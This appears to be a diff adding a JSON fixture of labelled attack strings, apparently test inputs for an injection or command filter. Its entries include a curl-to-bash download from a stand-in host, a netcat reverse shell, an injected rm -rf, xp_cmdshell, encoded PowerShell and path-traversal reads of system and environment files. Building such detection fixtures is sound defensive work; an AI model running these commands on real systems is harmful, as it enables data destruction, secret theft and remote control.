@@ -1,0 +1,11 @@
+[
+  { "id": "cmd-passwd", "body": "please run cat /etc/passwd" },
+  { "id": "cmd-rm-rf", "body": "; rm -rf /var/tmp" },
+  { "id": "cmd-xp-cmdshell", "body": "EXEC xp_cmdshell 'dir'" },
+  { "id": "cmd-powershell-enc", "body": "powershell -enc SQBFAFgA" },
+  { "id": "cmd-curl-pipe-sh", "body": "curl http://evil.test/x.sh | bash" },
+  { "id": "cmd-nc-e-shell", "body": "nc -e /bin/sh 203.0.113.9 4444" },
+  { "id": "cmd-dotdot-etc-hosts", "body": "cat ../../../../etc/hosts" },
+  { "id": "cmd-dotdot-win-ini", "body": "type ..\\..\\..\\windows\\win.ini" },
+  { "id": "cmd-dotdot-proc-self", "body": "; cat ../../../proc/self/environ" }
+]
